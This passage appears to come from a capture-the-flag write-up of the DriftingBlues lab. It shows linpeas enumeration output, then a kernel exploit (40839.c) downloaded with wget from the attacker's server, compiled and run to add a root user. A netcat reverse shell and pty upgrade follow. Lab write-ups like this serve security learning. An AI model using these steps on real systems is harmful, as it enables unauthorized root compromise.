NgQ+89QH3H1SfTfjOPrxtIr9U0bLhpzvR0WImyY6ktMCQ9iY78ut2nNKtS5GtKPX
Lie7M50jLnUsCLLF4pbxmhmphCdrNfo8BmoQ+jrjXXGPL+JDh8I8ZmcI4NihhYwB
IKpvM1sYHl7Pj5MyKEA+HVBdLQpH5HEvfm5oyFyWdybpNHdvIHu9vUazYzIzYLCd
xIivqHL7ys5BAcSUbUeCmJv+U5l6MUv5R1iZh4SWDzQiaxXKWQwKUuYf+axXZc8E
e2ypphzs41PZn0xsyDQ5UfmGjBOrPl/icVjbox/dfBik1TkVDGV8FuA1fjPG6D5p
/pnwljSCxwC27ygtEMACY80+tvuF/lzUvajm24kMi3gnkzkU3ZvVH0ErgmmYjykV
6Chv+bhlSEaB6TfWe/2cbu1ptnXLE1BWqU/C4Cc4HusB/Is1my1YTN9C9n0BTt8A
xbu3OWqg3zbRFeeC2MI4nToHFEzjHrYFxYyJIVaQBj1LpBcEQ3zVV9oxjkE1mrvg
+ECfSMONNI1N4wvWaZbNHkCGuaHHIb+sA+B04vqyylZzvr/pJWIpJAuY/CDEGT5W
t8r7cyY4hEZL738EzZlI
=2Irg
-----END PGP SIGNATURE-----


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
                                                                                                                              
══╣ Possible private SSH keys were found!
/usr/sbin/exim4

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ssl-cert-snakeoil.pem                                                                                          
3920PSTORAGE_CERTSBIN

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                              


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                            
                      ╚════════════════════════════════════╝                                                                  
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                               
strace Not Found                                                                                                              
-rwsr-xr-x 1 root root 952K Mar 14  2016 /usr/sbin/exim4                                                                      
-rwsr-xr-x 1 root root 46K May 25  2012 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 50K May 25  2012 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                      
-rwsr-xr-x 1 root root 41K May 25  2012 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K May 25  2012 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36K May 25  2012 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 10K Dec 23  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 11K Feb 11  2016 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-x 1 root root 240K Apr 14  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 36K Apr 12  2011 /bin/ping
-rwsr-xr-x 1 root root 93K Dec 11  2012 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 68K Dec 11  2012 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 36K May 25  2012 /bin/su
-rwsr-xr-x 1 root root 37K Apr 12  2011 /bin/ping6

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                               
-rwxr-sr-x 1 root tty 15K Jun 11  2012 /usr/bin/bsd-write                                                                     
-rwxr-sr-x 1 root tty 23K Dec 11  2012 /usr/bin/wall
-rwxr-sr-x 1 root shadow 54K May 25  2012 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K May 25  2012 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36K Jul  3  2012 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 127K Apr 14  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 35K Apr 29  2012 /sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                        
files with acls in searched folders Not Found                                                                                 
                                                                                                                              
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                
══╣ Current shell capabilities                                                                                                
CapInh: 0000000000000000                                                                                                      
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff

══╣ Parent proc capabilities
CapInh: 0000000000000000                                                                                                      
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff


Files with capabilities (limited to 50):

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                        
/etc/ld.so.conf                                                                                                               
Content of /etc/ld.so.conf:                                                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                 
  - /usr/local/lib                                                                                                            
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                     
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                               
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                              
total 12                                                                                                                      
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 72 root root 4096 Aug  9  2022 ..
-rw-r--r--  1 root root  660 Jun 17  2012 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                  
                                                                                                                              
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                  
═╣ Credentials in fstab/mtab? ........... No                                                                                  
═╣ Can I read shadow files? ............. No                                                                                  
═╣ Can I read shadow plists? ............ No                                                                                  
═╣ Can I write shadow plists? ........... No                                                                                  
═╣ Can I read opasswd file? ............. No                                                                                  
═╣ Can I write in network-scripts? ...... No                                                                                  
═╣ Can I read root folder? .............. No                                                                                  
                                                                                                                              
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                        
/root/
/var/www
/var/www/index.html
/var/www/textpattern
/var/www/textpattern/css.php
/var/www/textpattern/rpc
/var/www/textpattern/rpc/TXP_RPCServer.php
/var/www/textpattern/rpc/index.php
/var/www/textpattern/HISTORY.txt
/var/www/textpattern/themes
/var/www/textpattern/themes/.htaccess
/var/www/textpattern/textpattern
/var/www/textpattern/textpattern/config-dist.php
/var/www/textpattern/textpattern/mode.ini
/var/www/textpattern/textpattern/config.php
/var/www/textpattern/textpattern/include
/var/www/textpattern/textpattern/include/txp_link.php
/var/www/textpattern/textpattern/include/txp_css.php
/var/www/textpattern/textpattern/include/txp_article.php
/var/www/textpattern/textpattern/include/txp_section.php
/var/www/textpattern/textpattern/include/txp_file.php
/var/www/textpattern/textpattern/include/txp_discuss.php
/var/www/textpattern/textpattern/include/txp_skin.php
/var/www/textpattern/textpattern/include/txp_pane.php
/var/www/textpattern/textpattern/include/txp_diag.php
/var/www/textpattern/textpattern/include/txp_category.php
/var/www/textpattern/textpattern/include/txp_log.php
/var/www/textpattern/textpattern/include/txp_lang.php
/var/www/textpattern/textpattern/include/txp_tag.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                              
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                              
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                              
/run/lock                                                                                                                     
/run/lock/apache2
/run/shm
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_disk_cache
/var/lib/php5
/var/tmp
/var/www/textpattern/files
/var/www/textpattern/files/php-reverse-shell.php

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                              
  Group www-data:                                                                                                             
/tmp/linpeas.sh                                                                                                               



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                           
                            ╚═════════════════════════╝                                                                       
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                      
/usr/bin/gettext.sh                                                                                                           

╔══════════╣ Executable files potentially added by user (limit 70)
2022-08-09+10:15:02.4432626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vsock/Makefile.kernel                             
2022-08-09+10:15:02.4432626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vsock/Makefile
2022-08-09+10:15:02.4392626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmci/Makefile.normal
2022-08-09+10:15:02.4392626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmci/Makefile.kernel
2022-08-09+10:15:02.4392626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmci/Makefile
2022-08-09+10:15:02.4352626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmxnet/Makefile.kernel
2022-08-09+10:15:02.4352626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmxnet/Makefile
2022-08-09+10:15:02.4352626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmblock/Makefile.kernel
2022-08-09+10:15:02.4352626990 /var/lib/dkms/open-vm-tools/2012.05.21/build/vmblock/Makefile
2021-03-17+10:09:15.6800380160 /etc/rc.local

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                   
/vmlinuz
/selinux

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log                                                                                                             
/var/log/auth.log
/var/log/syslog
/var/log/messages

logrotate: bad argument --version: unknown error

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                              
╔══════════╣ Files inside others home (limit 20)
/var/www/index.html                                                                                                           
/var/www/textpattern/css.php
/var/www/textpattern/rpc/TXP_RPCServer.php
/var/www/textpattern/rpc/index.php
/var/www/textpattern/HISTORY.txt
/var/www/textpattern/themes/.htaccess
/var/www/textpattern/textpattern/config-dist.php
/var/www/textpattern/textpattern/mode.ini
/var/www/textpattern/textpattern/config.php
/var/www/textpattern/textpattern/include/txp_link.php
/var/www/textpattern/textpattern/include/txp_css.php
/var/www/textpattern/textpattern/include/txp_article.php
/var/www/textpattern/textpattern/include/txp_section.php
/var/www/textpattern/textpattern/include/txp_file.php
/var/www/textpattern/textpattern/include/txp_discuss.php
/var/www/textpattern/textpattern/include/txp_skin.php
/var/www/textpattern/textpattern/include/txp_pane.php
/var/www/textpattern/textpattern/include/txp_diag.php
/var/www/textpattern/textpattern/include/txp_category.php
/var/www/textpattern/textpattern/include/txp_log.php
grep: write error

╔══════════╣ Searching installed mail applications
exim                                                                                                                          
sendmail

╔══════════╣ Mails (limit 50)
                                                                                                                              
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 May 29  2016 /var/backups                                                                         
total 0


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 27304 Mar 19  2015 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so                                 
-rw-r--r-- 1 root root 10568 Aug  9  2022 /usr/share/info/dir.old
-rw-r--r-- 1 root root 12741 Mar 14  2016 /usr/share/doc/exim4-base/changelog.Debian.old.gz
-rw-r--r-- 1 root root 128 Mar 17  2021 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 29394 Mar 17  2021 /var/lib/aptitude/pkgstates.old
-rw-r--r-- 1 root root 673 Mar 17  2021 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Mar 17  2021 /etc/xml/catalog.old
-rw-r--r-- 1 root root 20 Mar 19  2015 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 123 Mar 17  2021 /etc/blkid.tab.old


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                    
total 80K
drwxr-xr-x  3 root root 4.0K Mar 17  2021 .
drwxr-xr-x 12 root root 4.0K Mar 17  2021 ..
-rw-r--r--  1 root root  53K Mar 15  2021 db.png
-rw-r--r--  1 root root  750 Mar 15  2021 index.html
-rw-r--r--  1 root root  110 Mar 15  2021 robots.txt
-rw-r--r--  1 root root  179 Mar 15  2021 spammer.zip
drwxr-xr-x  7 root root 4.0K Sep 13  2020 textpattern


╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Jan 30 01:49 /run/shm/.tmpfs                                                                         
-rw-r--r-- 1 root root 29 Mar 17  2021 /usr/lib/pymodules/python2.7/.path
-rw-r--r-- 1 root root 227 Sep 13  2020 /var/www/textpattern/themes/.htaccess
-rw-r--r-- 1 root root 71 Sep 13  2020 /var/www/textpattern/textpattern/plugins/.htaccess-dist
-rw-r--r-- 1 root root 159 Sep 13  2020 /var/www/textpattern/textpattern/.htaccess
-rw-r--r-- 1 root root 447 Sep 13  2020 /var/www/textpattern/textpattern/setup/.default-dist.json
-rw-r--r-- 1 root root 258 Sep 13  2020 /var/www/textpattern/files/.htaccess
-rw-r--r-- 1 root root 875 Sep 13  2020 /var/www/textpattern/.htaccess
-rw-r--r-- 1 root root 220 Sep 25  2014 /etc/skel/.bash_logout
-rw------- 1 root root 0 Mar 17  2021 /etc/.pwd.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                       
-rwxrwxrwx 1 www-data www-data 839912 Feb  2 07:12 /tmp/linpeas.sh                                                            

╔══════════╣ Searching passwords in config PHP files
                                                                                                                              
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                    
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/man/man7/credentials.7.gz
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                              
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                              
╔══════════╣ Searching passwords inside logs (limit 70)
                                                                                                                              


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                            
                                ╚════════════════╝                                                                            
Regexes to search for API keys aren't activated, use param '-r' 

```

Checking Linux kernel version

![](attachments/Pasted%20image%2020250214222551.png)

After looking into the operating system's version, I managed to find a relevant exploit

![](attachments/Pasted%20image%2020250214222519.png)

I was then able to exploit the existing kernel vulnerability to escalate my privileges on the machine to become root

```
$ wget http://IP:8000/40839.c
--2025-02-14 16:26:36--  http://IP:8000/40839.c
Connecting to IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/x-csrc]
Saving to: `40839.c'

     0K ....                                                  100% 1.14M=0.004s

2025-02-14 16:26:36 (1.14 MB/s) - `40839.c' saved [5006/5006]

$ gcc 40839.c -o exploit
/tmp/cca3U2mN.o: In function `generate_password_hash':
40839.c:(.text+0x1e): undefined reference to `crypt'
/tmp/cca3U2mN.o: In function `main':
40839.c:(.text+0x4cd): undefined reference to `pthread_create'
40839.c:(.text+0x501): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
$ chmod +x exploit
chmod: cannot access `exploit': No such file or directory
$ gcc -pthread 40839.c -o dirty -lcrypt
$ chmod +x dirty
$ ./dirty
Please enter the new password: test

id

^C
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [IP] from (UNKNOWN) [192.168.189.219] 37008
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 16:28:17 up  2:28,  0 users,  load average: 0.57, 0.15, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ su firefart
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/$ su firefart
su firefart
Password: test

firefart@driftingblues:/# id
id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@driftingblues:/# whoami
whoami
firefart
firefart@driftingblues:/# cd /root
cd /root
firefart@driftingblues:~# pwd
pwd
/root
firefart@driftingblues:~# 

```

